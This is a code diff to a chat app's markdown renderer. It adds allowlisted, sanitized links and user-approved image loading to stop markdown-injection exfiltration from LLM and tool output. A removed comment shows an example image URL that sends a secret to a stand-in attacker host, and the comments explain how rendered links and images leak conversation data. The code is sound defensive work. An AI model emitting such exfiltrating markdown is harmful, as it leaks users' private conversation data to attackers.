@@ -1,18 +1,27 @@
 import { isValidElement, type ReactNode } from "react";
+import { Button } from "@fluentui/react-components";
 import type { Components } from "react-markdown";
+import { useTranslation } from "react-i18next";
 import { collectVerbatimRanges } from "../Canvas/canvasHtmlWhitelist";
+import { useConfigContext } from "../../context/ConfigContext";
+import { isAllowedForSession, requestExternalLink } from "./externalLinkGuard";
+import { useImageApprovals } from "./imageApprovals";
 import styles from "./MarkdownRenderer.module.css";
 
 /**
  * Markdown link/image policy (issue #228: markdown injection).
  *
  * Links and images in LLM output, tool output, document content or shared
- * assistant metadata can exfiltrate conversation data: a rendered
- * `![](https://evil.example/?d=secret)` makes the browser send a request to
- * the attacker as soon as it is displayed, and clicking a link can leak the
- * same way. None of these surfaces can be trusted, so markdown links and
- * images render as plain text everywhere: no `<a>` element is created, no
- * `<img>` is ever fetched, the URL stays visible as text.
+ * assistant metadata can exfiltrate conversation data. The policy:
+ * - links on a configured allowlist domain (exact host, no port/userinfo,
+ *   from `GET /config`) render clickable as `desc (url)` with the full URL;
+ * - every other link stays clickable in the same format but loses its query
+ *   string, fragment and userinfo — the covert channels in a URL;
+ * - images from allowlist domains load automatically; all other images render
+ *   as a `desc (url)` placeholder with an approval button, and are fetched
+ *   only after the user has seen and approved the URL;
+ * - non-http(s)/mailto URLs (javascript:, data:, relative paths, …) render as
+ *   non-clickable text.
  */
 interface SafeLinkProps {
     href?: string;
@@ -33,6 +42,13 @@ const flattenText = (node: ReactNode): string => {
     return "";
 };
 
+/** A URL without its optional scheme prefix and trailing slash, for autolink comparison. */
+export const stripScheme = (url: string): string =>
+    url
+        .trim()
+        .replace(/^(?:https?:\/\/|mailto:)/i, "")
+        .replace(/\/$/, "");
+
 /**
  * Visible text for a neutralized link or image: the label plus the URL in
  * parentheses, unless one of them is empty or the label already contains the
@@ -46,23 +62,157 @@ export const describeLinkText = (label: string, url: string): string => {
     return text.includes(target) ? text : `${text} (${target})`;
 };
 
+export type UrlPolicyKind = "allowed" | "sanitized" | "blocked";
+
+export interface ClassifiedUrl {
+    kind: UrlPolicyKind;
+    url: string;
+}
+
+/**
+ * Classify a URL destination. Allowlisted exact hosts (web schemes, no port,
+ * no userinfo) keep the full URL; everything clickable is stripped of query
+ * string, fragment and userinfo; anything unparseable or outside
+ * `schemes` is blocked.
+ */
+const classifyBySchemes = (raw: string, allowedDomains: readonly string[], schemes: readonly string[]): ClassifiedUrl => {
+    const candidate = raw.trim();
+    let parsed: URL;
+    try {
+        parsed = new URL(candidate);
+    } catch {
+        return { kind: "blocked", url: candidate };
+    }
+    if (!schemes.includes(parsed.protocol)) return { kind: "blocked", url: candidate };
+    const isWeb = parsed.protocol === "https:" || parsed.protocol === "http:";
+    const hostAllowed = isWeb && parsed.username === "" && parsed.password === "" && parsed.port === "" && allowedDomains.includes(parsed.hostname);
+    if (hostAllowed) return { kind: "allowed", url: candidate };
+    parsed.username = "";
+    parsed.password = "";
+    parsed.search = "";
+    parsed.hash = "";
+    return { kind: "sanitized", url: parsed.href };
+};
+
+const CLICKABLE_SCHEMES = ["https:", "http:", "mailto:"];
+
+/**
+ * Classify a link destination. Allowlisted exact hosts keep the full URL;
+ * everything else is stripped of query string, fragment and userinfo and
+ * stays clickable; unparseable or non-web/mailto destinations are blocked.
+ */
+export const classifyUrl = (raw: string, allowedDomains: readonly string[]): ClassifiedUrl => classifyBySchemes(raw, allowedDomains, CLICKABLE_SCHEMES);
+
+/**
+ * Classify an image source: only http(s) URLs can ever load, allowlisted
+ * hosts automatically, everything else through the approval flow on the
+ * sanitized URL.
+ */
+export const classifyImageUrl = (raw: string, allowedDomains: readonly string[]): ClassifiedUrl => classifyBySchemes(raw, allowedDomains, ["https:", "http:"]);
+
+/**
+ * Click target for rendered links. Autolink literals invent a scheme for
+ * bare hosts (www.muenchen.de -> http://www.muenchen.de); an allowlisted
+ * bare host is a trusted TLS endpoint, so the invented scheme is upgraded
+ * there, never for paths or foreign hosts (allowlisted http-only services
+ * with a path must keep working).
+ */
+export const anchorHrefOf = (kind: UrlPolicyKind, url: string): string =>
+    kind === "allowed" && /^http:\/\/[^/?#]+$/.test(url) ? "https://" + url.slice("http://".length) : url;
+
 export const SafeMarkdownLink = ({ href, children }: SafeLinkProps) => {
-    const url = (href ?? "").trim();
-    if (!url) return <>{children}</>;
+    const { allowed_link_domains: allowedDomains } = useConfigContext();
+    const raw = (href ?? "").trim();
+    if (!raw) return <>{children}</>;
+    const { kind, url: classifiedUrl } = classifyUrl(raw, allowedDomains);
+    const url = anchorHrefOf(kind, classifiedUrl);
     const text = flattenText(children);
-    if (text.includes(url)) return <>{children}</>;
+    // Non-whitelisted links confirm with the user before the browser leaves
+    // the app (click and middle-click; the dialog store decides per session).
+    const guardedActivation = (event: { preventDefault(): void }) => {
+        if (kind === "sanitized" && !isAllowedForSession(url)) {
+            event.preventDefault();
+            requestExternalLink(url);
+        }
+    };
+    if (kind === "blocked") {
+        return text.includes(raw) ? (
+            <>{children}</>
+        ) : (
+            <>
+                {children}
+                <span className={styles.linkUrl}> ({raw})</span>
+            </>
+        );
+    }
+    if (text.includes(url) || text.includes(raw) || stripScheme(text) === stripScheme(url)) {
+        return (
+            <a href={url} target="_blank" rel="noopener noreferrer" onClick={guardedActivation} onAuxClick={guardedActivation}>
+                {children}
+            </a>
+        );
+    }
     return (
         <>
             {children}
-            <span className={styles.linkUrl}> ({url})</span>
+            <span className={styles.linkUrl}>
+                {" "}
+                (
+                <a href={url} target="_blank" rel="noopener noreferrer" onClick={guardedActivation} onAuxClick={guardedActivation}>
+                    {url}
+                </a>
+                )
+            </span>
         </>
     );
 };
 
-export const SafeMarkdownImage = ({ alt, src, title }: SafeImageProps) => {
-    const text = describeLinkText((alt ?? "").trim() || (title ?? "").trim(), src ?? "");
-    return text ? <span className={styles.linkUrl}>{text}</span> : null;
+/**
+ * The image ask: the sanitized URL is visible as text; "show" fetches and
+ * renders it, "don't show" leaves only the muted text for this session.
+ */
+const ImageApprovalPlaceholder = ({ label, url }: { label: string; url: string }) => {
+    const { t } = useTranslation();
+    const approvals = useImageApprovals();
+    if (approvals.isRejected(url)) {
+        const text = describeLinkText(label, url);
+        return <span className={styles.linkUrl}>{text}</span>;
+    }
+    return (
+        <span className={styles.imagePlaceholder} role="group">
+            <span className={styles.linkUrl}>{describeLinkText(label, url)}</span>
+            <Button size="small" appearance="primary" onClick={() => approvals.approve(url)}>
+                {t("chat.image_show")}
+            </Button>
+            <Button size="small" onClick={() => approvals.reject(url)}>
+                {t("chat.image_hide")}
+            </Button>
+        </span>
+    );
 };
+
+/**
+ * The image policy view: allowlisted or approved URLs render as <img>,
+ * everything else as a placeholder whose URL is never fetched without an
+ * explicit approval. Shared by chat answers and the canvas image node view.
+ */
+export const PolicyImage = ({ src, alt }: { src: string; alt: string }) => {
+    const { allowed_link_domains: allowedDomains } = useConfigContext();
+    const approvals = useImageApprovals();
+    const raw = src.trim();
+    if (!raw) return null;
+    const { kind, url } = classifyImageUrl(raw, allowedDomains);
+    if (kind === "blocked") {
+        const text = describeLinkText(alt, raw);
+        return text ? <span className={styles.linkUrl}>{text}</span> : null;
+    }
+    if (kind === "allowed" || approvals.isApproved(url)) {
+        return <img src={url} alt={alt || url} className={styles.markdownImage} loading="lazy" />;
+    }
+    return <ImageApprovalPlaceholder label={alt} url={url} />;
+};
+
+export const SafeMarkdownImage = ({ alt, src, title }: SafeImageProps) => <PolicyImage src={src ?? ""} alt={(alt ?? "").trim() || (title ?? "").trim()} />;
 
 export const safeMarkdownComponents: Components = {
     a: SafeMarkdownLink,
@@ -97,11 +247,11 @@ const transformOutsideVerbatim = (markdown: string, transform: (part: string) =>
 const LABEL_PATTERN = "((?:[^\\[\\]]|\\[[^\\[\\]]*\\])*)";
 const DESTINATION_PATTERN = "((?:<[^>]*>|(?:[^()\\s]|\\([^()]*\\))+))";
 const TITLE_PATTERN = "[ \\t]*(?:\"[^\"]*\"|'[^']*'|\\([^()]*\\))?[ \\t]*";
-const INLINE_IMAGE_RE = new RegExp(`!\\[${LABEL_PATTERN}\\]\\([ \\t]*${DESTINATION_PATTERN}${TITLE_PATTERN}\\)`, "g");
-const INLINE_LINK_RE = new RegExp(`\\[${LABEL_PATTERN}\\]\\([ \\t]*${DESTINATION_PATTERN}${TITLE_PATTERN}\\)`, "g");
+export const INLINE_IMAGE_RE = new RegExp(`!\\[${LABEL_PATTERN}\\]\\([ \\t]*${DESTINATION_PATTERN}${TITLE_PATTERN}\\)`, "g");
+export const INLINE_LINK_RE = new RegExp(`\\[${LABEL_PATTERN}\\]\\([ \\t]*${DESTINATION_PATTERN}${TITLE_PATTERN}\\)`, "g");
 
 // `[desc](url "title")` — an angle-wrapped destination keeps its inner value as-is.
-const destinationOf = (destination: string): string => {
+export const destinationOf = (destination: string): string => {
     const trimmed = destination.trim();
     const wrapped = trimmed.match(/^<([^>]*)>$/);
     return wrapped ? wrapped[1] : trimmed;
@@ -156,11 +306,10 @@ const splitAtVerbatimRanges = (markdown: string): string[] => {
 
 /**
  * Break markdown links and images down to their visible plain-text form
- * ("description (url)"), the same view the chat answer policy produces.
- * Used where the markdown itself is persisted (canvas editor): the stored
- * document must not contain link/image syntax that could later be rendered
- * or exported as clickable links or fetched images (issue #228). Fenced and
- * inline code are kept untouched.
+ * ("description (url)"). Used in the canvas ingestion pipeline, where
+ * prepareCanvasMarkdown protects policy-compliant image syntax from this
+ * conversion; the link-mark pass afterwards decides which "(url)" parts
+ * become clickable. Fenced and inline code are kept untouched.
  */
 export const markdownLinksToPlainText = (markdown: string): string => {
     // Definitions are collected once across all non-code ranges: a code span
